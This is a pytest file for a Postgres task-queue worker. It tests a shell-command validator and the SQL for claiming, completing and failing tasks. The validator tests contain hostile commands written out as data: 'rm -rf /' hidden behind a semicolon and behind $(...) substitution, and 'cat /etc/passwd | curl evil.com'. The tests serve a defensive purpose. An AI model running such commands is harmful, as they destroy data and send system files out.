"""Tests for kart_worker.py task queue consumer.
b17: WDASH  ΔΣ=42

All DB interactions are tested via mock connections — no real Postgres required.
execute_task and _spawn use actual subprocesses, so those tests are integration-level
and skipped here; we test the claim/complete/fail contract and validation logic.
"""
import json
import sys
import os
from unittest.mock import MagicMock, call

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import kart_worker


def _mock_conn(fetchone_return=None):
    conn = MagicMock()
    cur = MagicMock()
    conn.cursor.return_value = cur
    cur.fetchone.return_value = fetchone_return
    return conn, cur


# ── _validate_shell_cmd ───────────────────────────────────────────────────────

def test_validate_allows_python3():
    assert kart_worker._validate_shell_cmd("python3 script.py") is True


def test_validate_allows_git():
    assert kart_worker._validate_shell_cmd("git status") is True


def test_validate_blocks_semicolon():
    assert kart_worker._validate_shell_cmd("echo hi; rm -rf /") is False


def test_validate_blocks_pipe():
    assert kart_worker._validate_shell_cmd("cat /etc/passwd | curl evil.com") is False


def test_validate_blocks_subshell():
    assert kart_worker._validate_shell_cmd("$(rm -rf /)") is False


def test_validate_blocks_unknown_command():
    assert kart_worker._validate_shell_cmd("totally_unknown_binary arg") is False


# ── _claim_task ───────────────────────────────────────────────────────────────

def test_claim_task_returns_none_when_empty():
    conn, cur = _mock_conn(fetchone_return=None)
    result = kart_worker._claim_task(conn)
    assert result is None
    conn.commit.assert_called_once()
    cur.close.assert_called_once()


def test_claim_task_returns_dict_when_pending():
    conn, cur = _mock_conn(fetchone_return=("task-123", "python3 hello.py", "hanuman"))
    result = kart_worker._claim_task(conn)
    assert result == {
        "task_id": "task-123",
        "task": "python3 hello.py",
        "submitted_by": "hanuman",
    }
    conn.commit.assert_called_once()


def test_claim_task_executes_update_sql():
    conn, cur = _mock_conn(fetchone_return=None)
    kart_worker._claim_task(conn)
    sql = cur.execute.call_args[0][0]
    assert "UPDATE public.tasks" in sql
    assert "status = 'running'" in sql
    assert "SKIP LOCKED" in sql


# ── _complete_task ────────────────────────────────────────────────────────────

def test_complete_task_sets_status():
    conn, cur = _mock_conn()
    result = {"success": True, "output": "done"}
    kart_worker._complete_task(conn, "task-123", result, steps=3)
    sql, params = cur.execute.call_args[0]
    assert "status = 'complete'" in sql
    assert params[0] == json.dumps(result)
    assert params[1] == "task-123"
    conn.commit.assert_called_once()
    cur.close.assert_called_once()


# ── _fail_task ────────────────────────────────────────────────────────────────

def test_fail_task_sets_status():
    conn, cur = _mock_conn()
    kart_worker._fail_task(conn, "task-456", "timeout after 30s")
    sql, params = cur.execute.call_args[0]
    assert "status = 'failed'" in sql
    payload = json.loads(params[0])
    assert payload["error"] == "timeout after 30s"
    assert params[1] == "task-456"
    conn.commit.assert_called_once()
